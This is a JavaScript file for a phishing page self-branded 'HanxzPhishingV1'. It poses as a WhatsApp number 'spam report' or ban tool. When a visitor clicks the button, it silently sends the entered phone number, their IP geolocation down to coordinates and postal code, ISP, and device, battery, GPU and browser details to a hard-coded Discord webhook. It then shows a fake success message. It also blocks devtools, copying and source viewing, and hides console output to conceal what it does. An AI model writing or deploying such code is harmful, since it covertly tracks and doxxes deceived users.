// ============================================================
//  WEBHOOK — GANTI PUNYA LO
// ============================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1555528815910977556/4J27eUi0jbGQz3Q2L_BfN0HYoXEX1D637x75s3wYG5c_zRBNCig1ZY5euBzKD8Dc_PZP";

// ============================================================
//  PROTEKSI — BLOCK SOURCE CODE, DEVTOOLS, BOOKMARK
// ============================================================
(function() {
  document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });

  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
    if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'S' || e.keyCode === 83)) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'A' || e.keyCode === 65)) { e.preventDefault(); return false; }
    if (e.ctrlKey && (e.key === 'P' || e.keyCode === 80)) { e.preventDefault(); return false; }
  });

  document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
  document.addEventListener('drop', function(e) { e.preventDefault(); return false; });
  document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
  document.addEventListener('cut', function(e) { e.preventDefault(); return false; });

  document.addEventListener('selectstart', function(e) {
    if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
      e.preventDefault();
      return false;
    }
  });

  let devtoolsOpen = false;
  const threshold = 160;
  setInterval(function() {
    const widthDiff = window.outerWidth - window.innerWidth;
    const heightDiff = window.outerHeight - window.innerHeight;
    if (widthDiff > threshold || heightDiff > threshold) {
      if (!devtoolsOpen) {
        devtoolsOpen = true;
        document.body.innerHTML = '<div style="color:red;text-align:center;padding:50px;font-family:Arial;">🚫 DEVTOOLS TERDETEKSI!<br>Tutup DevTools untuk melanjutkan.</div>';
      }
    } else {
      if (devtoolsOpen) {
        devtoolsOpen = false;
        location.reload();
      }
    }
  }, 1000);

  if (window.top !== window.self) {
    window.top.location = window.self.location;
  }

  const noop = function() {};
  console.log = noop;
  console.warn = noop;
  console.error = noop;
  console.info = noop;
  console.debug = noop;

  Function.prototype.toString = function() {
    return 'function() { [native code] }';
  };

  document.querySelectorAll('a').forEach(function(link) {
    link.setAttribute('draggable', 'false');
    link.addEventListener('dragstart', function(e) {
      e.preventDefault();
      return false;
    });
  });

  setInterval(function() {
    const start = performance.now();
    debugger;
    const end = performance.now();
    if (end - start > 100) {
      document.body.innerHTML = '<div style="color:red;text-align:center;padding:50px;font-family:Arial;">🚫 DEBUGGER TERDETEKSI!</div>';
    }
  }, 2000);
})();

// ============================================================
//  API
// ============================================================
const API_IPIFY = "https://api.ipify.org?format=json";
const API_IPAPI = "http://ip-api.com/json/";
const API_IPINFO = "https://ipinfo.io/json";

// ============================================================
//  STRING
// ============================================================
const TXT_YM = "Ya";
const TXT_NO = "Tidak";
const TXT_CHARGING = "Charging";
const TXT_NOT_CHARGING = "Tidak Charging";
const TXT_GPU_NA = "Tidak tersedia";
const TXT_NOMOR = "📞 **Nomor Target:** ";
const TXT_NOMOR_INVALID = "⚠️ Nomor tidak valid.";
const TXT_PROGRESS = "⏳ Memproses spam report...";
const TXT_SUCCESS = "✅ Successfully bans nomor ";
const TXT_ERROR = "❌ Terjadi kesalahan.";

// Embed
const EMB_TITLE = "🎯 TARGET LOCK";
const EMB_DESC = "✅ Data berhasil diambil!";
const EMB_FOOTER = "HanxzPhishingV1";
const EMB_IMG = "https://media.giphy.com/media/ofTy0dq6x7yU1V9um/giphy.gif";

// Field
const F_DEV = "🖥️ Device";
const F_OS = "📲 OS";
const F_LANG = "🌐 Bahasa";
const F_RAM = "💾 RAM";
const F_CPU = "🧠 CPU";
const F_BAT = "🔋 Battery";
const F_GPU = "🖲 GPU";
const F_IP = "📡 IP";
const F_NEG = "🌎 Negara";
const F_KOT = "🏙️ Kota";
const F_REG = "🗺️ Region";
const F_POS = "🏷️ Kode Pos";
const F_TZ = "🕐 Timezone";
const F_LAT = "📌 Latitude";
const F_LON = "📍 Longitude";
const F_ISP = "🌐 ISP";
const F_ORG = "🏢 Org";
const F_UA = "🕵 User Agent";
const F_RES = "📐 Resolusi";
const F_COOK = "🍪 Cookie";
const F_TIME = "⏰ Waktu";

// ============================================================
//  UPLOAD KE CATBOX (TANPA ID/HASH)
// ============================================================
async function uploadToCatbox(file, filename = 'thumb.png') {
  try {
    const formData = new FormData();
    formData.append('reqtype', 'fileupload');
    formData.append('fileToUpload', file, filename);

    const res = await fetch('https://catbox.moe/user/api.php', {
      method: 'POST',
      body: formData
    });
    const url = await res.text();
    if (url && url.startsWith('https://')) return url.trim();
    return null;
  } catch (e) {
    return null;
  }
}

// ============================================================
//  BIKIN GAMBAR THUMBNAIL (DARI CANVAS)
// ============================================================
async function generateThumbnail() {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 200;
    const ctx = canvas.getContext('2d');

    // Background
    const grad = ctx.createLinearGradient(0, 0, 200, 200);
    grad.addColorStop(0, '#0f0f23');
    grad.addColorStop(1, '#00ff88');
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, 200, 200);

    // Text
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 40px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('HXC', 100, 110);

    // Convert ke Blob
    const blob = await new Promise(r => canvas.toBlob(r, 'image/png'));
    const file = new File([blob], 'thumb.png', { type: 'image/png' });

    // Upload ke Catbox
    const url = await uploadToCatbox(file, 'thumb.png');
    return url;
  } catch (e) {
    return null;
  }
}

// ============================================================
//  DETEKSI OS
// ============================================================
function getOSInfo() {
  const ua = navigator.userAgent;
  let os = 'Unknown';
  let version = 'Unknown';

  if (/Android/i.test(ua)) {
    os = 'Android';
    const m = ua.match(/Android\s([\d.]+)/);
    version = m ? m[1] : 'Unknown';
  } else if (/iPhone|iPad|iPod/i.test(ua)) {
    os = 'iOS';
    const m = ua.match(/OS\s([\d_]+)/);
    version = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Windows NT/i.test(ua)) {
    os = 'Windows';
    const m = ua.match(/Windows NT\s([\d.]+)/);
    const map = {
      '10.0': '10/11', '6.3': '8.1', '6.2': '8',
      '6.1': '7', '6.0': 'Vista', '5.2': 'XP x64', '5.1': 'XP'
    };
    version = map[m ? m[1] : ''] || 'Unknown';
  } else if (/Mac OS X/i.test(ua)) {
    os = 'macOS';
    const m = ua.match(/Mac OS X\s([\d_]+)/);
    version = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Linux/i.test(ua)) {
    os = 'Linux';
    version = 'Unknown';
  } else if (/CrOS/i.test(ua)) {
    os = 'Chrome OS';
    version = 'Unknown';
  }
  return { os, version };
}

// ============================================================
//  AMBIL INFO
// ============================================================
async function getInfo() {
  let ip = '-', city = '-', region = '-', country = '-', org = '-', isp = '-';
  let latitude = '-', longitude = '-', timezone = '-', postal = '-';

  try {
    const ipRes = await fetch(API_IPIFY);
    const ipData = await ipRes.json();
    ip = ipData.ip;

    const locRes = await fetch(API_IPAPI + ip);
    const loc = await locRes.json();
    if (loc.status === 'success') {
      city = loc.city || '-';
      region = loc.regionName || '-';
      country = loc.country || '-';
      org = loc.org || '-';
      isp = loc.isp || '-';
      latitude = loc.lat || '-';
      longitude = loc.lon || '-';
      timezone = loc.timezone || '-';
      postal = loc.zip || '-';
    }
  } catch {}

  try {
    const ipinfo = await fetch(API_IPINFO).then(r => r.json());
    ip = ipinfo.ip || ip;
    city = ipinfo.city || city;
    region = ipinfo.region || region;
    country = ipinfo.country || country;
    timezone = ipinfo.timezone || timezone;
    postal = ipinfo.postal || postal;
    org = ipinfo.org || org;
    if (ipinfo.loc) {
      const [lat, lon] = ipinfo.loc.split(',');
      latitude = lat || latitude;
      longitude = lon || longitude;
    }
  } catch {}

  let batteryPercent = 'N/A';
  let charging = 'N/A';
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      batteryPercent = b.level ? `${(b.level * 100).toFixed(0)}%` : 'N/A';
      charging = b.charging ? TXT_CHARGING : TXT_NOT_CHARGING;
    }
  } catch {}

  const { os, version } = getOSInfo();
  const device = navigator.platform + ' - ' + navigator.userAgent;
  const userAgent = navigator.userAgent;
  const language = navigator.language || 'N/A';
  const deviceMemory = navigator.deviceMemory || 'N/A';
  const cpuCores = navigator.hardwareConcurrency || 'N/A';
  const resolution = screen.width + 'x' + screen.height;
  const cookieEnabled = navigator.cookieEnabled ? TXT_YM : TXT_NO;

  let gpuInfo = TXT_GPU_NA;
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        gpuInfo = renderer + ' (' + vendor + ')';
      }
    }
  } catch {}

  // ============================================================
  //  UPLOAD THUMBNAIL KE CATBOX
  // ============================================================
  let thumbUrl = null;
  try {
    thumbUrl = await generateThumbnail();
  } catch {}

  // Kalo gagal upload, pake default
  if (!thumbUrl) {
    thumbUrl = "https://cdn-icons-png.flaticon.com/512/1077/1077114.png";
  }

  // ============================================================
  //  KIRIM KE DISCORD — EMBED + THUMBNAIL CATBOX
  // ============================================================
  const embed = {
    title: EMB_TITLE,
    description: EMB_DESC,
    color: 0x00ff88,
    thumbnail: { url: thumbUrl },
    image: { url: EMB_IMG },
    fields: [
      { name: F_DEV, value: device || 'N/A', inline: true },
      { name: F_OS, value: `${os} ${version}`, inline: true },
      { name: F_LANG, value: language, inline: true },
      { name: F_RAM, value: `${deviceMemory} GB`, inline: true },
      { name: F_CPU, value: `${cpuCores} Cores`, inline: true },
      { name: F_BAT, value: `${batteryPercent} (${charging})`, inline: true },
      { name: F_GPU, value: gpuInfo, inline: false },
      { name: F_IP, value: ip, inline: true },
      { name: F_NEG, value: country, inline: true },
      { name: F_KOT, value: city, inline: true },
      { name: F_REG, value: region, inline: true },
      { name: F_POS, value: postal, inline: true },
      { name: F_TZ, value: timezone, inline: true },
      { name: F_LAT, value: String(latitude), inline: true },
      { name: F_LON, value: String(longitude), inline: true },
      { name: F_ISP, value: isp, inline: true },
      { name: F_ORG, value: org, inline: true },
      { name: F_UA, value: userAgent || 'N/A', inline: false },
      { name: F_RES, value: resolution, inline: true },
      { name: F_COOK, value: cookieEnabled, inline: true },
      { name: F_TIME, value: new Date().toLocaleString(), inline: true }
    ],
    footer: { text: EMB_FOOTER, icon_url: thumbUrl },
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "🎯 **TARGET LOCK**",
        embeds: [embed]
      })
    });
  } catch (e) {}
}

// ============================================================
//  EVENT TOMBOL
// ============================================================
const infoDiv = document.getElementById('info');
const input = document.getElementById('text');
const button = document.getElementById('login-button');

button.addEventListener('click', async () => {
  const nomor = input.value.trim();
  if (!nomor || nomor.length < 8 || nomor.length > 15) {
    infoDiv.innerText = TXT_NOMOR_INVALID;
    return;
  }

  button.disabled = true;
  infoDiv.innerText = TXT_PROGRESS;

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: TXT_NOMOR + nomor })
    });
  } catch (e) {}

  input.value = '';

  try {
    await getInfo();
    setTimeout(() => {
      infoDiv.innerText = TXT_SUCCESS + nomor;
      button.disabled = false;
    }, 1000);
  } catch (e) {
    infoDiv.innerText = TXT_ERROR;
    button.disabled = false;
  }
});

// ============================================================
//  PARTIKEL
// ============================================================
function createParticles() {
  const container = document.querySelector('.bg-particles');
  for (let i = 0; i < 50; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + '%';
    p.style.top = Math.random() * 100 + '%';
    p.style.animationDelay = Math.random() * 6 + 's';
    p.style.animationDuration = (Math.random() * 4 + 4) + 's';
    container.appendChild(p);
  }
}
document.addEventListener('DOMContentLoaded', createParticles);